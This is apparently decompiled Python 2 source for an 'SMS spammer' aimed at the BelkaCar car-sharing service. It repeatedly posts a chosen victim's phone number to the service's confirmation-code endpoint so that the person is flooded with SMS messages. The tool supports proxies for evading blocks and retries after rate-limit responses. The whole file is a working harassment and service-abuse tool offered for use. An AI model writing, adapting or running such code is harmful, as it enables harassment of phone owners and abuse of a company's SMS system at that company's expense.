class BCSpammer:
    author = ''

    def main(self):
        print '+-+-+-+-+-+-+-+ BelkaCar SMS Spammer v1.0\n|S|p|a|m|m|e|r|\tAuthor: FSystem88\n+-+-+-+-+-+-+-+ https://github.com/FSystem88\n\t\t'
        import requests, datetime, sys, time, argparse
        parser = argparse.ArgumentParser(prog='BCSpammer ', description="Spammer is a tool used to send BelkaCar (SMS) to a phone number repeatedly. 1 SMS in 1 minute.", epilog='Contact me by mail fsystem88@bk.ru')
        parser.add_argument('phonenum', metavar='phone', help='the phone number to send the BelkaCar SMS. (example: 79153509908)')
        parser.add_argument('--delay', type=int, help='the delay time (wait time) in seconds | (dont work, only 1 SMS in 1 minute)')
        parser.add_argument('--proxy', type=int, help="use a proxy (format: '69.69.69.69:8080')")
        args = parser.parse_args()

        def showstatus(message, type='new'):
            now = datetime.datetime.now().strftime('%H:%M:%S')
            icon = '*'
            if type == 'warn':
                icon = '!'
            else:
                if type == 'new':
                    icon == '*'
            message = '[' + icon + '][' + now + ']' + message
            return message

        def wrapsbrace(string, endspace=False):
            if endspace == True:
                return '[' + string + '] '
            return '[' + string + ']'

        def sleep(x):
            try:
                time.sleep(x)
            except KeyboardInterrupt:
                print '\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn')
                exit()

        _phone = args.phonenum
        if _phone[0] == '0':
            _phone = list(_phone)
            _phone[0] = '62'
            _phone = ('').join(_phone)
        if _phone[0] == '8':
            _phone = '62' + str(_phone)
        iteration = 1
        print showstatus(wrapsbrace('info', True) + ('Send BelkaCar SMS to: {}').format(_phone))
        delaytime = 60
        if self.author != 'FSystem88':
            while True:
                print showstatus(wrapsbrace('200 OK', True) + ('No original tools! Sleeping f0r {}s . . . (iteration:{})').format(delaytime, iteration))
                sleep(1)
                iteration += 1

        if args.delay:
            delaytime = int(args.delay)
        while True:
            try:
                if not args.proxy:
                    r = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
                else:
                    r = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies={'http': args.proxy, 'https': args.proxy})
            except KeyboardInterrupt:
                print '\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn')
                exit()
            except requests.exceptions.ConnectionError:
                print showstatus(wrapsbrace('except', True) + ('ConnectionError thrown! Sleeping for {}s . . .').format(delaytime), 'warn')
                sleep(delaytime)
            else:
                if r.status_code == 429:
                    print showstatus(wrapsbrace(('429 {}').format(r.reason), True) + ('Sleeping for {}s . . .').format(delaytime), 'warn')
                    sleep(delaytime)
                elif r.status_code == 200:
                    print showstatus(wrapsbrace('200 OK', True) + ('BelkaCar SMS sent! Sleeping for {}s . . . (iteration:{})').format(delaytime, iteration))
                    iteration += 1
                    sleep(delaytime)
                else:
                    print showstatus(wrapsbrace(('{} {}').format(r.status_code, r.reason), True) + 'Something went wrong. Exiting . . .', 'warn')
                    exit()